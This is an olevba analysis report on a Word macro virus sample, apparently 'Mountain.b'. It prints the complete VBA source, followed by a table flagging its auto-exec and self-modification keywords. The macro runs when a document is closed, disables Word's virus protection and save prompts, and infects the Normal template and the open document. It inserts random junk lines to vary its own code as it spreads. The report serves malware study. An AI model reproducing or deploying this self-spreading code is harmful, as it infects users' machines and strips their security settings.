olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.b-1bed48fbebc42c66827c9c4345ce9fa82555f469
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.b-1bed48fbebc42c66827c9c4345ce9fa82555f469 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.Hill.b-1bed48fbebc42c66827c9c4345ce9fa82555f469 - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Mountain
Private Sub Document_Close()
Dim MountainJ, MountainMT
   On Error Resume Next
   'Macro.Word97.Mountain.b by Duke/SMF
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   Randomize
   MountainJ = 1
   MountainMT = Mid(AD.Lines(1, 1), 2)
   If NT.Lines(1, 1) <> "'Mountain" Then
      For i = 1 To AD.CountOfLines
         NT.InsertLines MountainJ, MountainRP(AD.Lines(i, 1), MountainMT, MountainGN(26, 65))
         MountainJ = MountainJ + 1
         MountainEX = Mid(AD.Lines(i, 1), 1, 1)
         If MountainEX = Asc(" ") Then MountainNT
      Next
   End If
   MountainJ = 1
   MountainMT = Mid(NT.Lines(1, 1), 2)
   If AD.Lines(1, 1) <> "'Mountain" Then
      For i = 1 To NT.CountOfLines
         AD.InsertLines MountainJ, MountainRP(NT.Lines(i, 1), MountainMT, MountainGN(26, 65))
         MountainJ = MountainJ + 1
         MountainEX = Mid(NT.Lines(i, 1), 1, 1)
         If MountainEX = Asc(" ") Then MountainAD
      Next
   End If
End Sub
Function MountainNT()
   R = Rnd
   If R < 1 And R > 0.08 Then
      NT.InsertLines MountainJ, " " + MountainGN(26, 65) + " = " + Chr(34) + MountainGN(128, 48) + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      NT.InsertLines MountainJ, " '" + MountainGN(128, 48)
   End If
   If R < 0.05 And R > 0.03 Then
      NT.InsertLines MountainJ, "  "
   End If
   If R > 0.03 Then MountainJ = MountainJ + 1
End Function
Function MountainAD()
   R = Rnd
   If R < 1 And R > 0.08 Then
      AD.InsertLines MountainJ, " " + MountainGN(26, 65) + " = " + Chr(34) + MountainGN(128, 48) + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      AD.InsertLines MountainJ, " '" + MountainGN(128, 48)
   End If
   If R < 0.05 And R > 0.03 Then
      AD.InsertLines MountainJ, "  "
   End If
   If R > 0.03 Then MountainJ = MountainJ + 1
End Function
Function MountainGN(x, y)
   MountainGN = ""
   For i = 1 To Int(20 * Rnd + 1)
      MountainGN = MountainGN + Chr(Int(x * Rnd + y))
   Next
End Function
Function MountainRP(s, a, b)
   i = 1
   Do While i < Len(s)
      If Mid(s, i, Len(a)) = a Then
         s = Mid(s, 1, i - 1) + b + Mid(s, i + 1)
      End If
   Loop
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

